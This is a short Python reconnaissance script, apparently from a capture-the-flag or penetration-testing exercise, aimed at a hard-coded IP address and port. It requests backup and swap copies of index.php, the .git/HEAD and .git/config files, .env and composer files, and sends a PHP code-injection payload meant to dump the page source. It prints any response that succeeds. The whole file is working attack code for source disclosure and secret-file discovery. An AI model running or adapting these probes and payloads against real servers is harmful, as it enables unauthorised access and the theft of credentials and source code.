import requests

url = 'http://51.159.16.22:8027/'

# Tenter de lire le source PHP
files_to_read = [
    '/?name=<?php echo file_get_contents("index.php"); ?>',
    '/index.php~',
    '/.index.php.swp',
    '/index.php.bak',
    '/index.php.old',
    '/source',
    '/.git/HEAD',
    '/.git/config',
    '/.env',
    '/composer.json',
    '/composer.lock',
]

for path in files_to_read:
    r = requests.get(f'http://51.159.16.22:8027{path}')
    if r.status_code == 200 and 'Not Found' not in r.text:
        print(f'[FOUND] {path}')
        print(r.text[:500])
        print('---')
    else:
        print(f'[FAIL]  {path} → {r.status_code}')
